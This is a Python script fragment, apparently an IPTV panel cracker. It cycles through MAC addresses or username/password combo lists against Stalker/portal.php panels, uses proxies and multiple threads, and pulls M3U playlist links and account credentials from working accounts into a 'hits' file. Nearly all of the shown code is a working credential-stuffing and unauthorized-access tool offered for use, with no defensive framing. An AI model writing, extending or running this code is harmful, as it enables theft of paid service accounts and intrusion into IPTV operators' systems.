                if m3uimage == "🅸🅼🅰🅶🅴 ✅":
                    state.counters.increment_m3uvpn(state)
                else:
                    state.counters.increment_m3uon(state)
                    
                if durum == "CHANNEL ❌":
                    state.counters.increment_macvpn(state)
                else:
                    state.counters.increment_macon(state)
                    
                hityaz(state, mac, trh, real, m3ulink, m3uimage, durum, vpn, playerapi, categories, current_panel, "MAC")
                
            except Exception as e:
                continue
                
        elif state.auth_method == "2":
            if state.cred_random_pattern:
                cred = state.counters.get_next_random_credential(state.cred_random_pattern)
            else:
                cred = state.counters.get_next_credential()
                
            if cred is None:
                break
                
            username, password = cred
            current_panel = state.counters.get_next_panel()
            if not current_panel:
                break
            
            scanned = state.counters.creds_scanned if not state.cred_random_pattern else state.counters.random_cred_index
            total = state.counters.total_creds
            oran = round((scanned / total * 100), 2) if total > 0 else 0
            new_cpm = echok(state, username, bot_id, total, state.counters.hit, oran, current_panel, "CRED")
            state.counters.update_cpm(new_cpm)
            
            token, trh = authenticate_with_credentials(state, username, password, current_panel)
            
            if not token:
                continue
            
            try:
                proxy = proxygetir(state)
                
                cid = "1842"
                user, pas, real = username, password, current_panel
                
                url = f"{state.http}://{current_panel}/{state.uzmanm}?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
                res = ses.get(url, headers=hea2(state, "dummy_mac", token, current_panel), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                if 'total' in veri:
                    cid = veri.split('ch_id":"')[5].split('"')[0]
                    
                url = url7(state, cid, current_panel)
                res = ses.get(url, headers=hea2(state, "dummy_mac", token, current_panel), timeout=3, proxies=proxy)
                veri = str(res.text)
                
                link = ""
                if 'ffmpeg ' in veri:
                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                    user = link.replace('live/', '').split('/')[3]
                    pas = link.replace('live/', '').split('/')[4]
                    real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                    

                m3ulink = f"http://{real.replace('http://', '').replace('/c/', '')}/get.php?username={user}&password={pas}&type=m3u_plus"
                playerlink = f"http://{real.replace('http://', '').replace('/c/', '')}/player_api.php?username={user}&password={pas}"
                plink = real.replace('http://', '').replace('/c/', '')
                
                categories = get_categories(state, "dummy_mac", token, current_panel)
                
                channel_working = test_channel(state, cid, user, pas, plink)
                durum = "CHANNEL ✅" if channel_working else "CHANNEL ❌"
                
                m3uimage = m3ugoruntu(state, cid, user, pas, plink)
                
                vpn = goruntu(state, link, cid) if link else "N/A"
                
                playerapi = m3uapi(state, playerlink, "dummy_mac", token, current_panel)
                
                state.counters.increment_hit()
                if m3uimage == "🅸🅼🅰🅶🅴 ✅":
                    state.counters.increment_m3uvpn(state)
                else:
                    state.counters.increment_m3uon(state)
                    
                if durum == "CHANNEL ❌":
                    state.counters.increment_macvpn(state)
                else:
                    state.counters.increment_macon(state)
                    
                hityaz(state, username, trh, real, m3ulink, m3uimage, durum, vpn, playerapi, categories, current_panel, "CRED")
                
            except Exception as e:
                print(f"Error testing credentials: {e}")
                continue

def main(state):
    subprocess.run(["cls" if os.name == "nt" else "clear"], shell=True)
    
    state.auth_method = input("""
Choose authentication method:

1 - MAC Address
2 - Username & Password

Select option (1 or 2): """)
    
    if state.auth_method not in ["1", "2"]:
        print("Invalid selection. Using MAC authentication by default.")
        state.auth_method = "1"
    
    state.nickn = input("Type your nick name to show in hit file!\n\nNick name = ")
    dosyaadi = str(input("Type the name of the new hit file!\n\nFile name = "))
    
    if dosyaadi == "":
        dosyaadi = "🅇🅄🄻🅃🄸🄼🄰🅃🄴"
    else:
        dosyaadi = dosyaadi
        dosyaadi = "🅇🅄🄻🅃🄸🄼🄰🅃🄴"
    
    hits_dir = os.path.join(os.getcwd(), "hits")
    if not os.path.exists(hits_dir):
        os.makedirs(hits_dir)
    
    state.Dosyab = os.path.join(hits_dir, dosyaadi + ".txt")
    
    panel_option = input("""
How would you like to provide panels?
1 - Manual input (comma separated)
2 - Load from file

Select option (1 or 2): """)
    
    panels = []
    if panel_option == "2":
        panel_dir = os.path.join(os.getcwd(), "panels")
        if not os.path.exists(panel_dir):
            os.makedirs(panel_dir)
            
        panel_files = [f for f in os.listdir(panel_dir) if f.endswith('.txt')]
        if not panel_files:
            print("No panel files found in 'panels' directory. Please create a text file with panel URLs.")
            return
            
        print("\nAvailable panel files:")
        for i, file in enumerate(panel_files, 1):
            print(f"{i} - {file}")
            
        try:
            file_choice = int(input("\nSelect panel file: "))
            selected_file = os.path.join(panel_dir, panel_files[file_choice - 1])
            panels = load_panels_from_file(selected_file)
            if not panels:
                print("No valid panels found in the selected file.")
                return
            print(f"Loaded {len(panels)} panels from {panel_files[file_choice - 1]}")
        except (ValueError, IndexError):
            print("Invalid selection. Using manual input instead.")
            panel_option = "1"
    
    if panel_option == "1" or not panels:
        panel_input = input("\nPanel:Port (comma separated for multiple) = ")
        panels = [p.strip() for p in panel_input.split(",") if p.strip()]
    
    if not panels:
        print("No panels provided. Exiting.")
        return
    
    state.counters.panels = panels
    
    ban = ""
    state.uzmanm = "portal.php"
    state.realblue = ""
    
    reqs = (
        "portal.php", "server/load.php", "c/portal.php", "stalker_portal/server/load.php",
        "stalker_portal/server/load.php - old", "stalker_portal/server/load.php - «▣»",
        "portal.php - Real Blue", "portal.php - httpS", "stalker_portal/server/load.php - httpS"
    )
    
    say = 0
    for i in reqs:
        say += 1
        print(f"{say}=⫸ {i}")
    
    uzmanm_input = input('\nNumber select = ')
    if uzmanm_input == "0":
        state.uzmanm = input("Write Request:")
    elif uzmanm_input == "":
        state.uzmanm = "portal.php"
    else:
        state.uzmanm = reqs[int(uzmanm_input)-1]
    
    if state.uzmanm == "stalker_portal/server/load.php - old":
        state.stalker_portal = "2"
        state.uzmanm = "stalker_portal/server/load.php"
    elif state.uzmanm == "stalker_portal/server/load.php - «▣»":
        state.stalker_portal = "1"
        state.uzmanm = "stalker_portal/server/load.php"
    elif state.uzmanm == "portal.php - No Ban":
        ban = "ban"
        state.uzmanm = "portal.php"
    
    state.http = "http"
    if state.uzmanm == "portal.php - Real Blue":
        state.realblue = "real"
        state.uzmanm = "portal.php"
    elif state.uzmanm == "portal.php - httpS":
        state.uzmanm = "portal.php"
        state.http = "https"
    elif state.uzmanm == "stalker_portal/server/load.php - httpS":
        state.uzmanm = "stalker_portal/server/load.php"
        state.http = "https"
    
    print(state.uzmanm)
    
    cleaned_panels = []
    for p in panels:
        cleaned = p.replace('stalker_portal', '')
        cleaned = cleaned.replace('http://', '')
        cleaned = cleaned.replace('/c/', '')
        cleaned = cleaned.replace('/c', '')
        cleaned = cleaned.replace('/', '')
        cleaned = cleaned.replace(' ', '')
        cleaned_panels.append(cleaned)
    
    state.counters.panels = cleaned_panels
    
    if state.auth_method == "1" or state.auth_method == "2":
        dosyasec(state)
    
    state.proxi = input("""
Do you want to use Proxies?

1 - Yes
2 - No

Write 1 or 2 = """)
    
    if state.proxi == "1":
        state.comboc = "proxy"
        dosyasec(state)
        state.pro = input("""
What is the proxy type in the file you selected?

1 - ipVanish
2 - Socks4 
3 - Socks5
4 - Http/Https

Proxy type = """)
    
    botgir_input = input("""
How many bots?

Bots = """)
    try:
        botgir = int(botgir_input) if botgir_input else 1
    except:
        botgir = 1
    
    if state.auth_method == "1":
        state.counters.total_macs_to_scan = state.combouz
    elif state.auth_method == "2":
        state.counters.total_creds = len(state.counters.credentials) if not state.cred_random_pattern else state.combouz
    
    for xdeep in range(botgir):
        XDeep = threading.Thread(target=XD, args=(state, xdeep+1,))
        XDeep.start()

state = AppState()
main(state)

